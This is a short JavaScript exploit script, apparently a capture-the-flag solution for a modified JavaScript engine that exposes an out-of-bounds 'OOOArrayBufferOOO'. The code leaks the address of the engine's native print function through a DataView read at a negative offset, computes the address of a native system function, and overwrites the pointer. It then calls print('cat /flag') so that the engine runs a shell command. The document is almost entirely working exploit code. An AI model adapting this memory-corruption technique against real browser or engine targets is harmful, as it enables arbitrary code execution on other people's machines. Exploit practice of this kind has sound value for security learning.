print("test");

var buffer = new OOOArrayBufferOOO(1024);
var view = new DataView(buffer);
var native_print = 0;
var native_print_higher = 0;
var offset = -24344;

for (var i = 3; i >= 0; i--)
{
	native_print = native_print << 8;
	native_print += view.getUint8(offset+i);
}

for (var i = 3; i >= 0; i--)
{
	native_print_higher = native_print_higher << 8;
	native_print_higher += view.getUint8(offset+4+i);
}


print("Found address of native_print 0x" + native_print_higher.toString(16) + native_print.toString(16));

var native_system = native_print - 0x50;

print("Going to overwrite with native_system 0x" + native_system.toString(16));

// Need to swap the bytes around b/c of javascript
view.setUint32(offset, ((native_system & 0xff) << 24) | ((native_system & 0xff00) << 8) | ((native_system >> 8) & 0xff00) | ((native_system >> 24) & 0xff));
print("cat /flag");





